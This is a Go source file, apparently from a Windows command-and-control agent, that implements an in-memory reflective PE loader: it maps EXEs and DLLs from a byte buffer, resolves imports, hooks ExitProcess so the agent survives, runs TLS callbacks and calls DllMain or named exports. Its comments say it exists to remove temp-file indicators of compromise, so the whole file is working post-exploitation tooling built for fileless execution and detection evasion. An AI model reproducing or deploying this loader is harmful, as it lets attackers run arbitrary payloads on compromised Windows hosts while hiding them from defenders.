//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
)

// peLoaderExec loads a native PE (EXE or DLL) into the current process from memory,
// executes it in a new thread, captures stdout/stderr output, and returns results.
// For EXEs: hooks ExitProcess in IAT to prevent agent termination.
// For DLLs: calls DllMain(DLL_PROCESS_ATTACH) then optional export function.
//
// This eliminates temp-file IOCs from execute-memory.
func peLoaderExec(peData []byte, cmdLine string, timeout int, exportName string) (string, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Parse DOS header
	dosHeader := (*imageDOSHeader)(unsafe.Pointer(&peData[0]))
	if dosHeader.EMagic != rlDOSSignature {
		return "", fmt.Errorf("invalid PE — missing MZ signature")
	}

	ntOffset := dosHeader.ELfanew
	if ntOffset < 0 || int(ntOffset)+4 > len(peData) {
		return "", fmt.Errorf("invalid PE — bad NT header offset")
	}

	// Parse NT headers
	ntSig := binary.LittleEndian.Uint32(peData[ntOffset:])
	if ntSig != rlNTSignature {
		return "", fmt.Errorf("invalid PE — missing PE signature")
	}

	fileHeader := (*imageFileHeader)(unsafe.Pointer(&peData[ntOffset+4]))
	if fileHeader.Machine != rlMachineMD64 {
		return "", fmt.Errorf("only x64 PE supported (machine: 0x%X)", fileHeader.Machine)
	}

	optHeaderOffset := ntOffset + 4 + int32(unsafe.Sizeof(imageFileHeader{}))
	optHeader := (*rlOptionalHeader64)(unsafe.Pointer(&peData[optHeaderOffset]))

	isDLL := (fileHeader.Characteristics & rlDLLCharacteristic) != 0

	// Allocate memory for the PE image (RW initially)
	allocBase, _, err := procVirtualAllocRL.Call(
		0,
		uintptr(optHeader.SizeOfImage),
		rlMemCommit|rlMemReserve,
		rlPageReadWrite,
	)
	if allocBase == 0 {
		return "", fmt.Errorf("VirtualAlloc failed: %v", err)
	}

	// Ensure cleanup on failure
	loadSuccess := false
	defer func() {
		if !loadSuccess {
			procVirtualFreeRL.Call(allocBase, 0, rlMemRelease)
		}
	}()

	// Copy headers
	copyMemory(allocBase, uintptr(unsafe.Pointer(&peData[0])), optHeader.SizeOfHeaders)

	// Copy sections
	sectionOffset := optHeaderOffset + int32(fileHeader.SizeOfOptionalHeader)
	sections := make([]imageSectionHeader, fileHeader.NumberOfSections)
	for i := uint16(0); i < fileHeader.NumberOfSections; i++ {
		off := sectionOffset + int32(i)*int32(unsafe.Sizeof(imageSectionHeader{}))
		sections[i] = *(*imageSectionHeader)(unsafe.Pointer(&peData[off]))
		sec := &sections[i]

		if sec.SizeOfRawData > 0 {
			if sec.PointerToRawData+sec.SizeOfRawData > uint32(len(peData)) {
				return "", fmt.Errorf("section %s extends beyond file", rlSectionName(sec.Name))
			}
			dest := allocBase + uintptr(sec.VirtualAddress)
			src := uintptr(unsafe.Pointer(&peData[sec.PointerToRawData]))
			copyMemory(dest, src, sec.SizeOfRawData)
		}

		// Zero BSS padding
		if sec.VirtualSize > sec.SizeOfRawData {
			zeroStart := allocBase + uintptr(sec.VirtualAddress) + uintptr(sec.SizeOfRawData)
			zeroSize := sec.VirtualSize - sec.SizeOfRawData
			rlZeroMemory(zeroStart, uintptr(zeroSize))
		}
	}

	// Process base relocations
	delta := int64(allocBase) - int64(optHeader.ImageBase)
	if delta != 0 {
		relocDir := optHeader.DataDirectory[rlDirEntryBaseReloc]
		if relocDir.VirtualAddress > 0 && relocDir.Size > 0 {
			_, relocErr := rlProcessRelocations(allocBase, uintptr(relocDir.VirtualAddress), uintptr(relocDir.Size), delta)
			if relocErr != nil {
				return "", fmt.Errorf("relocation error: %v", relocErr)
			}
		}
	}

	// Resolve imports — with ExitProcess hook for EXEs
	importDir := optHeader.DataDirectory[rlDirEntryImport]
	if importDir.VirtualAddress > 0 && importDir.Size > 0 {
		if isDLL {
			_, importErr := rlResolveImports(allocBase, uintptr(importDir.VirtualAddress))
			if importErr != nil {
				return "", fmt.Errorf("import error: %v", importErr)
			}
		} else {
			importErr := peLoaderResolveImportsHooked(allocBase, uintptr(importDir.VirtualAddress))
			if importErr != nil {
				return "", fmt.Errorf("import error: %v", importErr)
			}
		}
	}

	// Set section protections (W^X)
	for i := uint16(0); i < fileHeader.NumberOfSections; i++ {
		sec := &sections[i]
		prot := rlSectionProtection(sec.Characteristics)
		if prot == 0 {
			continue
		}
		var oldProt uint32
		procVirtualProtectRL.Call(
			allocBase+uintptr(sec.VirtualAddress),
			uintptr(sec.VirtualSize),
			uintptr(prot),
			uintptr(unsafe.Pointer(&oldProt)),
		)
	}

	// Flush instruction cache
	hProcess, _, _ := procGetCurrentProcRL.Call()
	procFlushICacheRL.Call(hProcess, allocBase, uintptr(optHeader.SizeOfImage))

	loadSuccess = true

	// Invoke TLS callbacks (if any) before entry point — required by PE spec
	peLoaderInvokeTLSCallbacks(allocBase, optHeader, isDLL)

	if isDLL {
		// For DLLs, call DllMain then optional export function
		return peLoaderCallDllMain(allocBase, optHeader, exportName)
	}

	// For EXEs, execute entry point in new thread with stdout/stderr capture
	entryPoint := allocBase + uintptr(optHeader.AddressOfEntryPoint)
	return peLoaderExecThread(entryPoint, cmdLine, timeout)
}

// peLoaderCallDllMain calls DllMain(DLL_PROCESS_ATTACH) for an in-memory mapped DLL,
// then optionally calls a named export function.
func peLoaderCallDllMain(allocBase uintptr, optHeader *rlOptionalHeader64, exportName string) (string, error) {
	var sb strings.Builder

	if optHeader.AddressOfEntryPoint != 0 {
		entryPoint := allocBase + uintptr(optHeader.AddressOfEntryPoint)
		ret, _, _ := syscall.SyscallN(entryPoint, allocBase, rlDllProcessAttach, 0)
		if ret == 0 {
			return "", fmt.Errorf("DllMain returned FALSE")
		}
		sb.WriteString("[+] DLL loaded and DllMain returned TRUE\n")
	} else {
		sb.WriteString("[+] DLL loaded (no entry point)\n")
	}

	// Call named export if requested
	if exportName != "" {
		exportAddr, err := peLoaderResolveExport(allocBase, optHeader, exportName)
		if err != nil {
			return sb.String(), fmt.Errorf("export resolution failed: %v", err)
		}
		sb.WriteString(fmt.Sprintf("[*] Calling export '%s' at 0x%X\n", exportName, exportAddr))
		syscall.SyscallN(exportAddr)
		sb.WriteString(fmt.Sprintf("[+] Export '%s' returned\n", exportName))
	}

	return sb.String(), nil
}

// peLoaderResolveExport resolves a named export function from an in-memory mapped PE.
func peLoaderResolveExport(allocBase uintptr, optHeader *rlOptionalHeader64, funcName string) (uintptr, error) {
	exportDir := optHeader.DataDirectory[0] // IMAGE_DIRECTORY_ENTRY_EXPORT
	if exportDir.VirtualAddress == 0 || exportDir.Size == 0 {
		return 0, fmt.Errorf("no export directory in DLL")
	}

	type exportDirectory struct {
		Characteristics       uint32
		TimeDateStamp         uint32
		MajorVersion          uint16
		MinorVersion          uint16
		Name                  uint32
		Base                  uint32
		NumberOfFunctions     uint32
		NumberOfNames         uint32
		AddressOfFunctions    uint32
		AddressOfNames        uint32
		AddressOfNameOrdinals uint32
	}

	expDir := (*exportDirectory)(unsafe.Pointer(allocBase + uintptr(exportDir.VirtualAddress)))

	for i := uint32(0); i < expDir.NumberOfNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(allocBase + uintptr(expDir.AddressOfNames) + uintptr(i)*4))
		name := readCString(allocBase + uintptr(nameRVA))

		if name == funcName {
			ordinal := *(*uint16)(unsafe.Pointer(allocBase + uintptr(expDir.AddressOfNameOrdinals) + uintptr(i)*2))
			funcRVA := *(*uint32)(unsafe.Pointer(allocBase + uintptr(expDir.AddressOfFunctions) + uintptr(ordinal)*4))
			return allocBase + uintptr(funcRVA), nil
		}
	}

	// List available exports for diagnostic purposes
	var available []string
	for i := uint32(0); i < expDir.NumberOfNames && i < 10; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(allocBase + uintptr(expDir.AddressOfNames) + uintptr(i)*4))
		available = append(available, readCString(allocBase+uintptr(nameRVA)))
	}
	if len(available) > 0 {
		return 0, fmt.Errorf("export '%s' not found (available: %s)", funcName, strings.Join(available, ", "))
	}
	return 0, fmt.Errorf("export '%s' not found", funcName)
}

// imageTLSDirectory64 represents IMAGE_TLS_DIRECTORY64.
type imageTLSDirectory64 struct {
	StartAddressOfRawData uint64
	EndAddressOfRawData   uint64
	AddressOfIndex        uint64
	AddressOfCallBacks    uint64 // pointer to null-terminated array of PIMAGE_TLS_CALLBACK
	SizeOfZeroFill        uint32
	Characteristics       uint32
}

// rlDirEntryTLS is data directory index 9 (IMAGE_DIRECTORY_ENTRY_TLS).
const rlDirEntryTLS = 9

// peLoaderInvokeTLSCallbacks calls any TLS callback functions registered in the PE.
// TLS callbacks must be invoked before the entry point per the PE specification.
// Each callback has the same signature as DllMain: func(hModule, reason, reserved).
func peLoaderInvokeTLSCallbacks(allocBase uintptr, optHeader *rlOptionalHeader64, isDLL bool) {
	if optHeader.NumberOfRvaAndSizes <= rlDirEntryTLS {
		return
	}

	tlsDir := optHeader.DataDirectory[rlDirEntryTLS]
	if tlsDir.VirtualAddress == 0 || tlsDir.Size == 0 {
		return
	}

	tls := (*imageTLSDirectory64)(unsafe.Pointer(allocBase + uintptr(tlsDir.VirtualAddress)))
	if tls.AddressOfCallBacks == 0 {
		return
	}

	// Walk the null-terminated callback array
	reason := uintptr(rlDllProcessAttach)
	for i := uintptr(0); ; i++ {
		callbackPtr := *(*uintptr)(unsafe.Pointer(uintptr(tls.AddressOfCallBacks) + i*8))
		if callbackPtr == 0 {
			break
		}
		// PIMAGE_TLS_CALLBACK has DllMain signature: (PVOID DllHandle, DWORD Reason, PVOID Reserved)
		syscall.SyscallN(callbackPtr, allocBase, reason, 0)
	}
}

// peLoaderIsNETAssembly checks if a PE has a CLR header (data directory entry 14),
// indicating it's a .NET assembly rather than a native PE.
func peLoaderIsNETAssembly(peData []byte) bool {
	if len(peData) < 64 {
		return false
	}

	dosHeader := (*imageDOSHeader)(unsafe.Pointer(&peData[0]))
	if dosHeader.EMagic != rlDOSSignature {
		return false
	}

	ntOffset := dosHeader.ELfanew
	if ntOffset < 0 || int(ntOffset)+4 > len(peData) {
		return false
	}

	ntSig := binary.LittleEndian.Uint32(peData[ntOffset:])
	if ntSig != rlNTSignature {
		return false
	}

	fileHeader := (*imageFileHeader)(unsafe.Pointer(&peData[ntOffset+4]))
	optHeaderOffset := ntOffset + 4 + int32(unsafe.Sizeof(imageFileHeader{}))

	// Check we have enough data for the optional header
	minOptSize := int(optHeaderOffset) + int(unsafe.Sizeof(rlOptionalHeader64{}))
	if minOptSize > len(peData) || fileHeader.SizeOfOptionalHeader < uint16(unsafe.Sizeof(rlOptionalHeader64{})) {
		return false
	}

	optHeader := (*rlOptionalHeader64)(unsafe.Pointer(&peData[optHeaderOffset]))

	// Data directory entry 14 = IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR (CLR header)
	const dirEntryCOMDescriptor = 14
	if optHeader.NumberOfRvaAndSizes <= dirEntryCOMDescriptor {
		return false
	}

	clrDir := optHeader.DataDirectory[dirEntryCOMDescriptor]
	return clrDir.VirtualAddress != 0 && clrDir.Size != 0
}

// peLoaderIsDLL checks if a PE has the DLL characteristic flag.
func peLoaderIsDLL(peData []byte) bool {
	if len(peData) < 64 {
		return false
	}

	dosHeader := (*imageDOSHeader)(unsafe.Pointer(&peData[0]))
	if dosHeader.EMagic != rlDOSSignature {
		return false
	}

	ntOffset := dosHeader.ELfanew
	if ntOffset < 0 || int(ntOffset)+4 > len(peData) {
		return false
	}

	fileHeader := (*imageFileHeader)(unsafe.Pointer(&peData[ntOffset+4]))
	return (fileHeader.Characteristics & rlDLLCharacteristic) != 0
}
